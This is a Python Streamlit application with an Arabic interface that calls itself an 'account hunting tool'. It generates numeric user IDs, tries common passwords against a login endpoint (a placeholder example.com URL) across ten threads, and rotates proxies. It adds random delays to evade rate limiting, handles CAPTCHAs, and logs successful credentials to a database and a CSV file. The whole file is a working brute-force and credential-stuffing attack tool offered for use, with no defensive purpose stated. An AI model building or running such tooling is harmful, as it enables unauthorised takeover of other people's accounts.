import re
import random
import requests
import string
import time
import sqlite3
import streamlit as st
import pandas as pd
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
from io import BytesIO
from PIL import Image

proxy_queue = []
stop_attack = False
MAX_RETRIES = 3

def init_db():
    conn = sqlite3.connect("results.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT,
            password TEXT,
            status TEXT,
            duration REAL
        )
    """)
    conn.commit()
    return conn

def load_proxies(limit):
    global proxy_queue
    try:
        response = requests.get(
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt", timeout=10
        )
        if response.status_code == 200:
            all_proxies = response.text.splitlines()
            proxy_queue = validate_proxies(all_proxies[:limit])
            st.success(f"تم تحميل {len(proxy_queue)} وكيل صالح.")
        else:
            st.warning("لم يتم العثور على وكلاء.")
    except Exception as e:
        st.error(f"خطأ أثناء تحميل الوكلاء: {e}")

def validate_proxies(proxies):
    valid_proxies = []
    session = get_session()
    for proxy in proxies:
        try:
            session.proxies = {"http": proxy, "https": proxy}
            response = session.get("http://www.google.com", timeout=5)
            if response.status_code == 200:
                valid_proxies.append(proxy)
        except:
            continue
    return valid_proxies

@st.cache_resource
def get_session():
    return requests.Session()

def generate_complex_uid():
    uid_length = random.randint(12, 16)
    prefix = random.choice(["1000", "1001", "1002"])
    timestamp_part = str(int(time.time()))[-5:]
    random_part = ''.join(random.choices(string.digits, k=uid_length - len(prefix) - len(timestamp_part)))
    return prefix + random_part + timestamp_part

def load_from_file(file):
    if file is not None:
        return [line.strip() for line in file.getvalue().decode("utf-8").splitlines()]
    return []

def attempt_login(uid, password, proxy=None, retries=0):
    """محاولة تسجيل الدخول مع حد إعادة المحاولة."""
    session = get_session()
    status = "failed"
    start_time = time.time()

    try:
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        
        # Simulate request that encounters a CAPTCHA or other failure
        response = session.post("http://example.com/login", data={"uid": uid, "password": password}, timeout=10)

        if response.status_code == 200:
            status = "success"
        elif "captcha" in response.text:
            status = solve_captcha(response)  # Handle CAPTCHA
        else:
            status = "failed"
    except requests.RequestException as e:
        status = f"error: {e}"

    end_time = time.time()
    duration = end_time - start_time

    # Retry logic for failed attempts
    if status == "failed" and retries < MAX_RETRIES:
        retries += 1
        st.warning(f"Retrying {uid}... Attempt {retries}")
        return attempt_login(uid, password, proxy, retries)  # Retry the login

    return uid, password, status, duration

def solve_captcha(response):
    """Prompt user to solve CAPTCHA manually."""
    st.warning("تم اكتشاف CAPTCHA. حلها لإكمال محاولة تسجيل الدخول.")
    captcha_image_url = "http://example.com/captcha_image"  # Placeholder

    # Fetch and display the CAPTCHA image
    captcha_response = requests.get(captcha_image_url)
    img = Image.open(BytesIO(captcha_response.content))
    st.image(img, caption="CAPTCHA", use_column_width=True)

    # Ask user to input the CAPTCHA solution
    captcha_solution = st.text_input("الرجاء إدخال رمز CAPTCHA:")

    # Return "captcha_passed" if user provides a solution (mock)
    if st.button("إرسال"):
        if captcha_solution:
            st.success("تم حل CAPTCHA بنجاح.")
            return "captcha_passed"
        else:
            return "captcha_failed"
def run_attack_in_batches(uids, passwords, proxies, conn):
    """تشغيل محاولات الهجوم بشكل متزامن على UIDات متعددة."""
    global stop_attack
    stop_attack = False

    total_attempts = len(uids) * len(passwords)
    progress_bar = st.progress(0)  # Initialize progress bar
    progress = 0  # Track the progress
    successful_attempts = 0
    failed_attempts = 0

    # Clear previous progress/results
    st.empty()

    if proxies:
        proxy_cycle = cycle(proxies)
    else:
        proxy_cycle = None

    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_login = {
            executor.submit(attempt_login, uid, password, next(proxy_cycle) if proxy_cycle else None): (uid, password)
            for uid in uids for password in passwords
        }

        for future in as_completed(future_to_login):
            if stop_attack:
                st.warning("تم إيقاف الهجوم.")
                break

            uid, password = future_to_login[future]
            try:
                result = future.result()
                log_to_db(conn, *result)

                # Success or failure indicator
                if result[2] == "success":
                    successful_attempts += 1
                    st.success(f"UID: {result[0]}, Password: {result[1]}, Status: {result[2]}, Duration: {result[3]:.2f} ثانية")
                else:
                    failed_attempts += 1
                    st.error(f"UID: {result[0]}, Password: {result[1]}, Status: {result[2]}, Duration: {result[3]:.2f} ثانية")

            except Exception as exc:
                st.error(f"خطأ في محاولة UID: {uid}, Password: {password}. {exc}")
                failed_attempts += 1
                log_failed_attempt(uid, password, exc)  # Log failed attempt

            # Update progress
            progress += 1
            progress_bar.progress(progress / total_attempts)  # Update progress bar

            time.sleep(random.uniform(2, 5))  # Random delay to avoid rate-limiting

    # Post-attack: Summary and options
    st.write("### ملخص الهجوم")
    st.write(f"عدد المحاولات: {total_attempts}")
    st.write(f"عدد المحاولات الناجحة: {successful_attempts}")
    st.write(f"عدد المحاولات الفاشلة: {failed_attempts}")
    
    # Option to export results
    if st.button("تصدير النتائج إلى ملف CSV"):
        export_to_csv()
        st.success("تم تصدير النتائج بنجاح إلى ملف results.csv")

    if st.button("إعادة تعيين قاعدة البيانات"):
        reset_database(conn)
        st.success("تم إعادة تعيين قاعدة البيانات.")

def reset_database(conn):
    """إعادة تعيين قاعدة البيانات ومسح النتائج."""
    cursor = conn.cursor()
    cursor.execute("DELETE FROM results")
    conn.commit()

def export_to_csv():
    """تصدير النتائج إلى ملف CSV."""
    conn = sqlite3.connect("results.db")
    query = "SELECT uid, password, status, duration FROM results"
    df = pd.read_sql_query(query, conn)
    df.to_csv("results.csv", index=False)
    st.success("تم تصدير النتائج إلى ملف results.csv")

def log_failed_attempt(uid, password, error):
    """تسجيل المحاولات الفاشلة."""
    with open("failed_attempts.log", "a") as log_file:
        log_file.write(f"UID: {uid}, Password: {password}, Error: {error}\n")

def log_to_db(conn, uid, password, status, duration):
    """تسجيل نتائج المحاولات في قاعدة البيانات."""
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO results (uid, password, status, duration) VALUES (?, ?, ?, ?)",
        (uid, password, status, duration)
    )
    conn.commit()

def log_to_db(conn, uid, password, status, duration):
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO results (uid, password, status, duration) VALUES (?, ?, ?, ?)",
        (uid, password, status, duration)
    )
    conn.commit()

def main():
    st.title("أداة صيد الحسابات")
    st.sidebar.header("إعدادات")

    conn = init_db()

    #proxy_limit = st.sidebar.number_input("حدد عدد الوكلاء:", min_value=1, max_value=500, value=50)
    #if st.sidebar.button("تحميل الوكلاء"):
        #load_proxies(proxy_limit)


    passwords_input = st.sidebar.text_area("أدخل كلمات المرور (مفصولة بسطر):", "123456\npassword")
    passwords = [pw.strip() for pw in passwords_input.splitlines()]


    #uids_file = st.sidebar.file_uploader("تحميل UIDات من ملف:", type=["txt"])
    passwords_file = st.sidebar.file_uploader("تحميل كلمات مرور من ملف:", type=["txt"])


    uid_count = st.sidebar.number_input("عدد UIDات:", min_value=1, max_value=100, value=5)
    uids = [generate_complex_uid() for _ in range(uid_count)]
    #uids = load_from_file(uids_file) if uids_file else [generate_complex_uid() for _ in range(5)]
    passwords = load_from_file(passwords_file) if passwords_file else ["123456", "password"]

    #st.write("UIDات المستخدمة:")
    #for uid in uids:
        #st.write(uid)

    if st.button("ابدأ الهجوم"):
        st.info("يتم الآن تنفيذ الهجوم... انتظر من فضلك.")
        run_attack_in_batches(uids, passwords, proxy_queue, conn)

    if st.button("إيقاف الهجوم"):
        global stop_attack
        stop_attack = True

    if st.button("تصدير النتائج إلى CSV"):
        export_to_csv()

    st.subheader("النتائج")
    if st.button("عرض النتائج"):
        cursor = conn.cursor()
        cursor.execute("SELECT uid, password, status, duration FROM results")
        rows = cursor.fetchall()
        for row in rows:
            st.write(f"UID: {row[0]}, Password: {row[1]}, Status: {row[2]}, Duration: {row[3]:.2f} ثانية")

if __name__ == "__main__":
    main()
